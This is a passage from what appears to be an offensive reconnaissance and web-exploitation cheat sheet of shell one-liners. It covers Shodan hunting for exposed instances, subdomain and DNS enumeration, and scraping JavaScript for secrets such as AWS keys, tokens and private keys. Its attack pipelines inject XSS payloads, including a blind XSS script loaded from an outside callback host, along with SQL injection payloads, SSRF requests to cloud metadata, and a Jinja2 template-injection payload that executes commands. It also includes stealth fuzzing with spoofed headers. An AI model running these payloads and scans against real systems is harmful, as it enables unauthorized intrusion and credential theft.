shodan search "Clawdbot ssl:true" --fields ip_str,port,ssl.cert.subject.CN,ssl.cert.issuer.O | sort -u | anew clawdbot_ssl.txt
```

#### ⚡ 10. Clawdbot Realtime Monitor + Alert
```bash
# 💀 Continuous monitoring for new Clawdbot instances
while true; do shodan search "Clawdbot" --fields ip_str,port,timestamp --limit 50 | sort -t$'\t' -k3 -r | head -10 | anew clawdbot_new.txt && sleep 3600; done &
```

### 💀 ASN Discovery & Reverse DNS
```bash
# ☠️ Find all IPs from organization ASN
echo 'target_org' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'
```

### 💀 DNS Bruteforce with Shuffledns
```bash
shuffledns -d target.com -w wordlist.txt -r resolvers.txt -silent | httpx -silent | anew
```

### 💀 Recursive Subdomain Enum
```bash
subfinder -d target.com -recursive -all -silent | dnsx -silent | httpx -silent | anew recursive_subs.txt
```

### 💀 Passive DNS - Multiple Sources
```bash
# ☠️ HackerTarget
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com" | cut -d',' -f1 | anew subs.txt

# ☠️ RapidDNS
curl -s "https://rapiddns.io/subdomain/target.com?full=1" | grep -oP '(?<=target="_blank">)[^<]+' | grep "target.com" | anew subs.txt

# ☠️ Riddler.io
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -oP '\b([a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+target\.com\b' | anew subs.txt

# ☠️ AlienVault OTX
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/passive_dns" | jq -r '.passive_dns[].hostname' 2>/dev/null | sort -u | anew subs.txt

# ☠️ URLScan.io
curl -s "https://urlscan.io/api/v1/search/?q=domain:target.com" | jq -r '.results[].page.domain' 2>/dev/null | sort -u | anew subs.txt
```

### 💀 GitHub Subdomain Scraping
```bash
github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt
```

### 💀 Censys Subdomain Discovery
```bash
# ☠️ Using Censys API
censys search "target.com" --index-type hosts | jq -r '.[] | .name' | sort -u | anew censys_subs.txt
```

### 💀 SecurityTrails API
```bash
# ☠️ SecurityTrails subdomain enumeration
curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" -H "APIKEY: YOUR_API_KEY" | jq -r '.subdomains[]' | sed 's/$/.target.com/' | anew subs.txt
```

### 💀 Wayback Machine Subdomains
```bash
# ☠️ Extract subdomains from Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e 's/\/.*//g' | sort -u | anew wayback_subs.txt
```

### 💀 CommonCrawl Extraction
```bash
# ☠️ CommonCrawl subdomain extraction
curl -s "https://index.commoncrawl.org/CC-MAIN-2023-50-index?url=*.target.com&output=json" | jq -r '.url' | sed -e 's_https*://__' -e 's/\/.*//g' | sort -u | anew commoncrawl_subs.txt
```

### 💀 VirusTotal Subdomains
```bash
# ☠️ VirusTotal API
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=YOUR_API_KEY&domain=target.com" | jq -r '.subdomains[]' 2>/dev/null | anew vt_subs.txt
```

### 💀 DNS Zone Transfer Attempt
```bash
# ☠️ Check for zone transfer vulnerability
dig axfr @ns1.target.com target.com | grep -E "^[a-zA-Z0-9]" | awk '{print $1}' | sed 's/\.$//' | anew zone_transfer.txt
```

### 💀 Reverse IP Lookup
```bash
# ☠️ Find domains on same IP
host target.com | awk '/has address/ {print $4}' | xargs -I@ sh -c 'curl -s "https://api.hackertarget.com/reverseiplookup/?q=@"' | anew reverse_ip.txt
```

### 💀 BGP/ASN Range Scanner
```bash
# ☠️ Get ASN and scan all IP ranges
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+" | xargs -I@ sh -c 'nmap -sL @ | grep "report for" | cut -d" " -f5' | httpx -silent | anew bgp_hosts.txt
```

### 💀 PTR Records from IP Range
```bash
# ☠️ Mass PTR lookup
prips 192.168.1.0/24 | xargs -P50 -I@ sh -c 'host @ 2>/dev/null | grep "pointer" | cut -d" " -f5' | sed 's/\.$//' | anew ptr_subs.txt
```

### 💀 All-in-One Mega Oneliner
```bash
# ☠️ THE ULTIMATE SUBDOMAIN HUNTER ☠️
(subfinder -d target.com -all -silent; amass enum -passive -d target.com; assetfinder -subs-only target.com; findomain -t target.com -q; chaos -d target.com -silent; curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g'; curl -s "https://api.hackertarget.com/hostsearch/?q=target.com" | cut -d',' -f1; curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e 's/\/.*//g') | sort -u | httpx -silent -threads 100 | anew mega_subs.txt
```

### 💀 Subdomain Permutation/Bruteforce
```bash
# ☠️ Generate permutations and resolve
cat subs.txt | dnsgen - | shuffledns -d target.com -r resolvers.txt -silent | anew permutation_subs.txt
```

### 💀 DNS Wordlist Bruteforce with PureDNS
```bash
# ☠️ Fast bruteforce with PureDNS
puredns bruteforce wordlist.txt target.com -r resolvers.txt -w puredns_subs.txt
```

### 💀 TLS/SSL Certificate Grabber
```bash
# ☠️ Extract subdomains from SSL certificates
echo target.com | httpx -silent | xargs -I@ sh -c 'echo | openssl s_client -connect @:443 2>/dev/null | openssl x509 -noout -text | grep -oP "DNS:[^\s,]+" | sed "s/DNS://"' | sort -u | anew ssl_subs.txt
```

### 💀 Favicon Hash -> Shodan
```bash
# ☠️ Find related hosts via favicon hash
curl -s https://target.com/favicon.ico | md5sum | awk '{print $1}' | xargs -I@ shodan search "http.favicon.hash:@" --fields ip_str,hostnames | anew favicon_hosts.txt
```

### 💀 Google Dork Subdomain Discovery
```bash
# ☠️ Use Google dorks (manual or with tools)
# site:*.target.com -www
# inurl:target.com
```

---

## 🔐 TLS/SSL Reconnaissance (TLSX)

<div align="center">

```
████████╗██╗     ███████╗██╗  ██╗    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
╚══██╔══╝██║     ██╔════╝╚██╗██╔╝    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
   ██║   ██║     ███████╗ ╚███╔╝     ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
   ██║   ██║     ╚════██║ ██╔██╗     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
   ██║   ███████╗███████║██╔╝ ██╗    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
```

**🔐 TLS/SSL Certificate Intelligence with TLSX 🔐**

</div>

### 🔐 Basic TLS Certificate Scan
```bash
# 🔐 Full TLS certificate details extraction
echo target.com | tlsx -san -cn -so -sv -ss -serial -hash md5 -jarm -ja3 -wc -tps -ve -ce -ct -cdn -silent | tee tlsx_full.txt
```

### 🔐 Subdomain Discovery via SANs
```bash
# 🔐 Extract all subdomains from certificate SANs
subfinder -d target.com -silent | tlsx -san -cn -silent -resp-only | grep -oE "[a-zA-Z0-9.-]+\.target\.com" | sort -u | anew san_subdomains.txt
```

### 🔐 Expired Certificate Hunter
```bash
# 🔐 Find hosts with expired SSL certificates
cat hosts.txt | tlsx -expired -silent -cn -so | tee expired_certs.txt
```

### 🔐 Self-Signed Certificate Detection
```bash
# 🔐 Identify self-signed certificates (potential security issue)
cat hosts.txt | tlsx -self-signed -silent -cn -so -hash sha256 | tee self_signed.txt
```

### 🔐 TLS Version Enumeration (Weak TLS)
```bash
# 🔐 Find hosts with deprecated TLS versions (TLS 1.0/1.1)
cat hosts.txt | tlsx -tls-version -silent | grep -E "(tls10|tls11)" | tee weak_tls_versions.txt
```

### 🔐 JARM Fingerprinting Pipeline
```bash
# 🔐 JARM fingerprint for server identification and correlation
subfinder -d target.com -silent | httpx -silent | tlsx -jarm -silent -json | jq -r '[.host, .jarm_hash] | @tsv' | sort -k2 | anew jarm_fingerprints.txt
```

### 🔐 Certificate Chain & Issuer Analysis
```bash
# 🔐 Analyze certificate chain and identify CA
cat hosts.txt | tlsx -so -serial -hash sha256 -ve -ce -json -silent | jq -r '[.host, .issuer_cn, .not_after, .serial] | @tsv' | anew cert_chain_analysis.txt
```

### 🔐 Mass TLS Scan with Cipher Enumeration
```bash
# 🔐 Full cipher suite enumeration + TLS version
subfinder -d target.com -silent | httpx -silent | tlsx -cipher -tls-version -silent -json | jq -r '[.host, .version, .cipher] | @tsv' | anew cipher_enum.txt
```

### 🔐 Mismatched Certificate Detection
```bash
# 🔐 Find certificates where CN doesn't match the hostname
cat hosts.txt | tlsx -mismatched -cn -san -silent | tee mismatched_certs.txt
```

### 🔐 Ultimate TLS Recon Pipeline
```bash
# 🔐 Complete TLS intelligence gathering
subfinder -d target.com -all -silent | httpx -silent -p 443,8443,4443,9443 | tlsx -san -cn -so -sv -ss -serial -expired -self-signed -mismatched -tls-version -jarm -hash sha256 -json -silent | jq -c '{host: .host, cn: .subject_cn, san: .san, issuer: .issuer_cn, expired: .expired, self_signed: .self_signed, tls: .version, jarm: .jarm_hash}' | tee tlsx_full_recon.json
```

---

## 🌐 DNS Intelligence (DNSX)

<div align="center">

```
██████╗ ███╗   ██╗███████╗██╗  ██╗    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔══██╗████╗  ██║██╔════╝╚██╗██╔╝    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██║  ██║██╔██╗ ██║███████╗ ╚███╔╝     ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██║  ██║██║╚██╗██║╚════██║ ██╔██╗     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
██████╔╝██║ ╚████║███████║██╔╝ ██╗    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
```

**🌐 DNS Reconnaissance & Intelligence Gathering with DNSX 🌐**

</div>

### 🌐 1. Mass DNS Resolution + Wildcard Filtering
```bash
# 🌐 Resolve subdomains and filter out wildcards
subfinder -d target.com -silent | dnsx -silent -a -resp-only -wd target.com | sort -u | anew resolved_ips.txt
```

### 🌐 2. Multi-Record Type DNS Enumeration
```bash
# 🌐 Query A, AAAA, CNAME, MX, NS, TXT records simultaneously
echo target.com | dnsx -silent -a -aaaa -cname -mx -ns -txt -resp | tee full_dns_records.txt
```

### 🌐 3. CNAME Extraction for Subdomain Takeover
```bash
# 🌐 Find dangling CNAMEs pointing to vulnerable services
subfinder -d target.com -silent | dnsx -silent -cname -resp-only | grep -iE "(s3|cloudfront|herokuapp|github|azure|shopify|fastly|pantheon|zendesk|readme|ghost|surge|bitbucket|wordpress|tumblr)" | anew cname_takeover_candidates.txt
```

### 🌐 4. Reverse DNS (PTR) on IP Ranges
```bash
# 🌐 Discover hidden hosts via reverse DNS lookups
prips 192.168.1.0/24 | dnsx -silent -ptr -resp-only | anew ptr_discovered_hosts.txt
```

### 🌐 5. MX Records for Email Security Analysis
```bash
# 🌐 Extract MX records to identify mail servers and SPF bypass opportunities
cat domains.txt | dnsx -silent -mx -resp | awk '{print $1, $2}' | sort -u | tee mx_records.txt && cat domains.txt | dnsx -silent -txt -resp | grep -i "spf" | anew spf_records.txt
```

### 🌐 6. NS Records + DNS Zone Transfer Check
```bash
# 🌐 Enumerate nameservers and check for misconfigured zone transfers
cat domains.txt | dnsx -silent -ns -resp-only | tee nameservers.txt && cat nameservers.txt | xargs -I@ -P10 sh -c 'host -t axfr target.com @ 2>&1 | grep -v "failed\|timed out" && echo "[ZONE TRANSFER] @"' | anew zone_transfers.txt
```

### 🌐 7. DNS Brute-force with Custom Resolvers
```bash
# 🌐 Mass DNS brute-force with custom resolver list
cat wordlist.txt | sed 's/$/.target.com/' | dnsx -silent -r resolvers.txt -rl 500 -t 200 -retry 3 -resp-only | anew bruteforced_subs.txt
```

### 🌐 8. JSON Output for Advanced Parsing
```bash
# 🌐 Full DNS recon with JSON output for pipeline integration
subfinder -d target.com -silent | dnsx -silent -a -aaaa -cname -mx -ns -txt -ptr -resp -json | jq -c '{host: .host, a: .a, aaaa: .aaaa, cname: .cname, mx: .mx, ns: .ns, txt: .txt}' | tee dns_full_recon.json
```

### 🌐 9. ASN Discovery via DNS + IP Correlation
```bash
# 🌐 Resolve domains, extract unique IPs, and identify ASN ownership
subfinder -d target.com -silent | dnsx -silent -a -resp-only | sort -u | tee target_ips.txt | xargs -I{} sh -c 'whois {} 2>/dev/null | grep -iE "(netname|orgname|asn|origin)" | head -5' | anew asn_info.txt
```

### 🌐 10. Ultimate DNS Recon Pipeline
```bash
# 🌐 Complete DNS intelligence gathering
domain="target.com"; subfinder -d $domain -all -silent | tee subs_$domain.txt | dnsx -silent -a -aaaa -cname -mx -ns -txt -resp -json -o dns_records_$domain.json; cat subs_$domain.txt | dnsx -silent -cname -resp-only | grep -iE "(s3|cloudfront|azure|github)" | anew takeover_$domain.txt; cat dns_records_$domain.json | jq -r '.a[]?' | sort -u | dnsx -silent -ptr -resp-only | anew ptr_$domain.txt; echo "[+] DNS Recon Complete: $(wc -l < subs_$domain.txt) subdomains | $(cat dns_records_$domain.json | wc -l) records"
```

> **🎯 Pro Tip:** Use custom resolvers for better performance: `dnsx -r resolvers.txt -rl 1000`

---

## 📜 JavaScript Recon

### Complete JS Pipeline
```bash
subfinder -d target.com -silent | httpx -silent | katana -d 5 -jc -silent | grep -iE '\.js$' | anew js.txt
```

### Extract Secrets from JS
```bash
cat js.txt | httpx -silent -sr -srd js_files/ && nuclei -t exposures/ -target js.txt
```

### LinkFinder on JS Files
```bash
cat js.txt | xargs -I@ -P10 bash -c 'python3 linkfinder.py -i @ -o cli 2>/dev/null' | anew endpoints.txt
```

### SecretFinder Mass Scan
```bash
cat js.txt | xargs -I@ -P5 python3 SecretFinder.py -i @ -o cli | anew secrets.txt
```

### JS Variables Extraction
```bash
cat file.js | grep -oE "var\s+\w+\s*=\s*['\"][^'\"]+['\"]" | sort -u
```

### API Keys from JS
```bash
cat js.txt | nuclei -t http/exposures/tokens/ -silent | anew api_keys.txt
```

### Extract All URLs from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "(https?://[^\"\'\`\s\<\>]+)" | sort -u | anew js_urls.txt
```

### Find API Endpoints in JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "(/api/[^\"\'\`\s\<\>]+|/v[0-9]+/[^\"\'\`\s\<\>]+)" | sort -u
```

### Extract Hardcoded Credentials
```bash
cat js.txt | xargs -I@ curl -s @ | grep -iE "(password|passwd|pwd|secret|api_key|apikey|token|auth)" | sort -u
```

### Extract AWS Keys from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "(AKIA[0-9A-Z]{16}|ABIA[0-9A-Z]{16}|ACCA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})" | sort -u | anew aws_keys.txt
```

### Extract Google API Keys from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "AIza[0-9A-Za-z\-_]{35}" | sort -u | anew google_api_keys.txt
```

### Extract Firebase URLs from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "https://[a-zA-Z0-9-]+\.firebaseio\.com|https://[a-zA-Z0-9-]+\.firebase\.com" | sort -u | anew firebase_urls.txt
```

### Extract S3 Buckets from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9.-]+|s3-[a-zA-Z0-9-]+\.amazonaws\.com/[a-zA-Z0-9.-]+" | sort -u | anew s3_from_js.txt
```

### Extract Internal IPs from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})" | sort -u | anew internal_ips.txt
```

### Extract Slack Webhooks from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+" | sort -u | anew slack_webhooks.txt
```

### Extract GitHub Tokens from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|ghu_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|ghr_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})" | sort -u | anew github_tokens.txt
```

### Extract Private Keys from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY( BLOCK)?-----" | sort -u | anew private_keys_found.txt
```

### Extract Email Addresses from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u | anew emails_from_js.txt
```

### Extract Hidden Subdomains from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sed 's|https\?://||' | cut -d'/' -f1 | sort -u | anew subdomains_from_js.txt
```

### 💀 Extract GraphQL Endpoints from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "(graphql|gql|query|mutation)[^\"']*" | grep -oE "/[a-zA-Z0-9/_-]*graphql[a-zA-Z0-9/_-]*" | sort -u | anew graphql_endpoints.txt
```

### 💀 Extract JWT Tokens from JS Files
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | sort -u | anew jwt_tokens.txt
```

### 💀 Find Webpack Source Maps
```bash
cat js.txt | sed 's/\.js$/.js.map/' | httpx -silent -mc 200 -ct -match-string "sourcesContent" | anew sourcemaps.txt
```

### 💀 Extract Discord Webhooks from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+" | sort -u | anew discord_webhooks.txt
```

### 💀 Find Hidden Admin Routes in JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "[\"\'][/][a-zA-Z0-9_/-]*(admin|dashboard|manage|config|settings|internal|private|debug|api/v[0-9])[a-zA-Z0-9_/-]*[\"\']" | tr -d "\"'" | sort -u | anew hidden_routes.txt
```

---

## 💉 XSS Detection

### Dalfox Pipeline
```bash
cat urls.txt | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence --skip-bav
```

### Blind XSS with Callback
```bash
cat urls.txt | gf xss | qsreplace '"><script src=https://xss.report/c/YOURID></script>' | httpx -silent
```

### Airixss Fast Scan
```bash
echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```

### Knoxss API
```bash
cat urls.txt | gf xss | uro | xargs -I@ curl -s "https://knoxss.me/api/v3" -d "target=@" -H "X-API-KEY: YOUR_KEY"
```

### DOM XSS Detection
```bash
cat js.txt | xargs -I@ bash -c 'curl -s @ | grep -E "(document\.(location|URL|cookie|domain|referrer)|innerHTML|outerHTML|eval\(|\.write\()" && echo "--- @ ---"'
```

### Mass XSS with Nuclei DAST
```bash
cat urls.txt | httpx -silent | nuclei -dast -t dast/vulnerabilities/xss/ -rl 50
```

### Reflected Parameter Detection
```bash
cat urls.txt | kxss 2>/dev/null | grep -v "Not Reflected" | anew reflected_params.txt
```

### XSS Polyglot Testing
```bash
cat urls.txt | gf xss | qsreplace "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcLiCk=alert() )//" | httpx -silent -mr "alert"
```

---

## 🗄️ SQL Injection

### SQLMap Mass Scan
```bash
cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
```

### Error-Based Detection
```bash
cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql|oracle" | anew sqli_errors.txt
```

### Time-Based Blind
```bash
cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10 | anew time_based.txt
```

### Ghauri Scan
```bash
cat sqli.txt | xargs -I@ ghauri -u @ --batch --level 3
```

### UNION Detection
```bash
cat urls.txt | gf sqli | qsreplace "1 UNION SELECT NULL,NULL,NULL-- -" | httpx -silent -mc 200
```

### Boolean-Based Detection
```bash
cat urls.txt | gf sqli | qsreplace "1' AND '1'='1" | httpx -silent -mc 200 | anew boolean_sqli.txt
```

### NoSQL Injection
```bash
cat urls.txt | qsreplace '{"$gt":""}' | httpx -silent -mc 200 | anew nosqli.txt
cat urls.txt | qsreplace "admin'||'1'=='1" | httpx -silent | anew nosqli.txt
```

---

## 🌐 SSRF & SSTI

### SSRF with Interactsh
```bash
cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent
```

### SSRF Parameter Fuzzing
```bash
cat urls.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent -match-string "ami-id"
```

### SSTI Detection
```bash
cat urls.txt | gf ssti | qsreplace "{{7*7}}" | httpx -silent -match-string "49" | anew ssti_vuln.txt
```

### SSTI Payload Test
```bash
cat urls.txt | qsreplace '${7*7}' | httpx -silent -mr "49" && cat urls.txt | qsreplace '<%= 7*7 %>' | httpx -silent -mr "49"
```

### Full SSRF Chain
```bash
cat params.txt | grep -iE "(url|uri|path|src|dest|redirect|redir|return|next|target|out|view|page|show|fetch|load)" | qsreplace "http://YOURSERVER" | httpx -silent
```

### SSRF with DNS Rebinding
```bash
cat urls.txt | gf ssrf | qsreplace "http://7f000001.burpcollaborator.net" | httpx -silent
```

### Jinja2 SSTI
```bash
cat urls.txt | qsreplace "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" | httpx -silent
```

---

## 🕷️ Web Crawling

### Katana Deep Crawl
```bash
katana -u https://target.com -d 10 -jc -kf all -aff -silent | anew crawl.txt
```

### Gospider Full Crawl
```bash
gospider -s https://target.com -c 20 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)" | anew
```

### Hakrawler with Scope
```bash
echo https://target.com | hakrawler -d 5 -subs -u | anew hakrawler.txt
```

### ParamSpider Discovery
```bash
paramspider -d target.com --exclude woff,css,js,png,svg,jpg -o params.txt
```

### Waymore Historical URLs
```bash
waymore -i target.com -mode U -oU urls.txt
```

### Crawl with Headless Browser
```bash
katana -u https://target.com -headless -d 5 -jc -silent | anew headless_crawl.txt
```

### Extract Forms
```bash
katana -u https://target.com -f qurl -silent | grep "?" | anew forms.txt
```

### 💀 Katana Multi-Target Deep Crawl + JS Parsing
```bash
# ☠️ Crawl multiple targets with JavaScript parsing and form extraction
cat alive.txt | katana -d 8 -jc -kf all -aff -ef woff,css,png,svg,jpg,woff2,jpeg,gif,ico -c 50 -p 20 -silent -o katana_multi.txt
```

### 💀 Gospider Recursive + Sitemap + Robots
```bash
# ☠️ Full crawl with sitemap parsing and robots.txt extraction
gospider -S alive.txt -c 30 -d 5 -t 20 --sitemap --robots --js -a -w --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)" -o gospider_output && cat gospider_output/* | grep -oE 'https?://[^"]+' | sort -u | anew gospider_urls.txt
```

### 💀 Hakrawler + Wayback + GAU Combined Crawler
```bash
# ☠️ Triple source crawling: live + wayback + gau
echo target.com | hakrawler -d 5 -subs -u > hakrawler.txt && waybackurls target.com > wayback.txt && gau target.com > gau.txt && cat hakrawler.txt wayback.txt gau.txt | sort -u | httpx -silent | anew all_crawled.txt
```

### 💀 Katana Headless + Form Autofill + Screenshot
```bash
# ☠️ Headless browser crawl with form interaction and XHR capture
katana -u https://target.com -headless -d 6 -jc -aff -xhr -form -timeout 15 -silent -nc -c 20 | anew headless_interactive.txt
```

### 💀 Cariddi Full Crawl with Secret Detection
```bash
# ☠️ Crawl with built-in secrets/endpoints/parameters extraction
cariddi -u https://target.com -d 5 -s -e -ext 1 -plain -t 50 -c 20 | tee cariddi_results.txt && grep -E "(api|secret|key|token|pass|auth)" cariddi_results.txt | anew secrets_found.txt
```

### 💀 Parallel Domain Crawler Pipeline
```bash
# ☠️ Mass parallel crawling with deduplication
cat domains.txt | parallel -j 10 "katana -u https://{} -d 5 -jc -silent" | uro | anew parallel_crawl.txt
```

### 💀 Katana + Gospider + LinkFinder Chain
```bash
# ☠️ Combined crawling + JS endpoint extraction pipeline
katana -u https://target.com -d 5 -jc -silent | grep "\.js$" | httpx -silent | xargs -I@ bash -c 'curl -s @ | grep -oE "(\/[a-zA-Z0-9_\-\/]+)" | sort -u' | anew js_endpoints.txt && gospider -s https://target.com -d 5 -c 10 --js -q | grep -oE 'https?://[^"]+' | anew combined_crawl.txt
```

### 💀 Recursive Crawl + Nuclei Auto-Scan Pipeline
```bash
# ☠️ Crawl then auto-scan discovered endpoints for vulnerabilities
katana -u https://target.com -d 6 -jc -kf all -aff -silent | tee crawl_output.txt | grep -E "\.(php|asp|aspx|jsp|do|action)(\?|$)" | nuclei -t /root/nuclei-templates/ -severity high,critical -silent -o crawl_vulns.txt
```

### 💀 Waymore + Katana Historical + Live Merge
```bash
# ☠️ Merge historical URLs with live crawl for maximum coverage
waymore -i target.com -mode U -oU waymore_urls.txt && katana -u https://target.com -d 5 -jc -aff -silent -o katana_live.txt && cat waymore_urls.txt katana_live.txt | uro | httpx -silent -mc 200,301,302,403 | anew merged_crawl.txt
```

### 💀 Multi-Crawler Output Dedup + Parameter Extraction
```bash
# ☠️ Run all crawlers and extract unique parameters
(gospider -s https://target.com -d 3 -c 10 -q; hakrawler -url https://target.com -d 3; katana -u https://target.com -d 3 -jc -silent) | sort -u | unfurl -u keys | sort | uniq -c | sort -rn | head -100 | anew top_params.txt
```

---

## 🔑 Parameter Discovery

### X8 Hidden Parameters
```bash
cat urls.txt | httpx -silent | xargs -I@ x8 -u @ -w params.txt
```

### Arjun Discovery
```bash
arjun -i urls.txt -oT arjun_params.txt --stable
```

### Custom Param Bruteforce
```bash
cat urls.txt | sed 's/$/\?FUZZ=test/' | ffuf -w params.txt:FUZZ -u FUZZ -mc 200,301,302 -ac
```

### Mine Parameters from JS
```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "[?&][a-zA-Z0-9_]+=" | cut -d'=' -f1 | tr -d '?&' | sort -u
```

### Parameter Pollution Test
```bash
cat urls.txt | qsreplace 'param=value1&param=value2' | httpx -silent -mc 200
```

---

## 📁 Content Discovery

### Ffuf Directory Bruteforce
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -ac -c -t 100
```

### 💀 Recursive Fuzzing - ffuf Deep Scan
```bash
# ☠️ Recursive directory bruteforce with depth 3
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3 -mc 200,301,302,403 -ac -c -t 100 -o ffuf_recursive.json -of json
```

### 💀 Feroxbuster Full Recursive Scan
```bash
# ☠️ Deep recursive scan with auto-tune and smart filtering
feroxbuster -u https://target.com -w wordlist.txt -d 5 -L 4 --auto-tune -C 404,500 --smart -o ferox_results.txt
```

### 💀 Feroxbuster Multi-Target Recursive
```bash
# ☠️ Scan multiple targets from file with recursion
cat alive.txt | xargs -I@ feroxbuster -u @ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 3 -t 50 --no-state -q -o ferox_@.txt
```

### 💀 ffuf + Feroxbuster Pipeline (Extensions + Recursion)
```bash
# ☠️ Find directories with ffuf, then deep scan each with feroxbuster
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302 -ac -c -t 100 -o dirs.json -of json && cat dirs.json | jq -r '.results[].url' | xargs -I@ feroxbuster -u @ -w wordlist.txt -x php,asp,aspx,jsp,html,js -d 2 -t 30 -q
```

### 💀 Recursive Fuzzing with Extensions Mass Scan
```bash
# ☠️ ffuf recursive with multiple extensions + backup files
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -e .php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.bak,.old,.txt,.conf,.config,.zip,.tar.gz -mc 200,301,302,403,500 -ac -t 80 -rate 100 -o recursive_ext.json
```

### 💀 Feroxbuster Parallel Recursive Scan
```bash
# ☠️ Parallel scan with multiple wordlists and extensions
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,jsp,bak,old,zip -d 4 -t 100 -L 5 --parallel 10 --dont-extract-links -C 404 -o ferox_parallel.txt
```

### 💀 Feroxbuster Silent Recursive + Headers
```bash
# ☠️ Stealth recursive scan with custom headers and rate limiting
feroxbuster -u https://target.com -w wordlist.txt -d 3 -t 30 -r -k --random-agent -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" --rate-limit 50 -C 400,401,403,404,500 -q -o ferox_stealth.txt
```

### 💀 Feroxbuster Extract Links + Recursive
```bash
# ☠️ Extract links from responses and add to scan queue recursively
